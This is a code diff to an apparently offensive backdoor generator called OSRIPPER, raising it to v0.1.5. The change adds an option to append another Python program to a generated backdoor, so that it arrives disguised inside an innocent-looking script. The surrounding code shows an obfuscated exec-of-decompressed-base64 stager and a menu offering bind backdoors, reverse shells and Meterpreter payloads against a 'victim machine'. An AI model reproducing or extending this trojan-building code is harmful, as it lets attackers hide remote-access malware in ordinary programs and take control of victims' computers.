@@ -49,7 +49,7 @@ logo = """
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-                                                                           OSRIPPER v0.1.4
+                                                                           OSRIPPER v0.1.5
 """
 
 clear = lambda: os.system('clear')
@@ -253,7 +253,14 @@ while len(d)<l:
 exec(zlib.decompress(base64.b64decode(d)),{'s':s})
 '''
         ina.write(b)
-        ina.close
+        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
+        if opt_bind == 'y':
+            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
+            with open(bind_file, 'r') as bindfile:
+                bindfilecontent=bindfile.read()
+                ina.write(bindfilecontent)
+                bindfile.close
+
         print('(*) Generated Backdoor and saved as '+name)
 def postgen():
     opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
@@ -279,7 +286,7 @@ print("""
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Reverse Shell (TCP (Encryption not recommended)) (Connects back to you)
         3. Create Reverse Meterpreter (HTTP) (Connects back to you)
-        4. Create Encrypted TCP Meterpreter (SSL) connects back to you
+        4. Create Encrypted TCP Meterpreter (can embed in other script) (SSL) connects back to you
         5. Open a listener
         
 
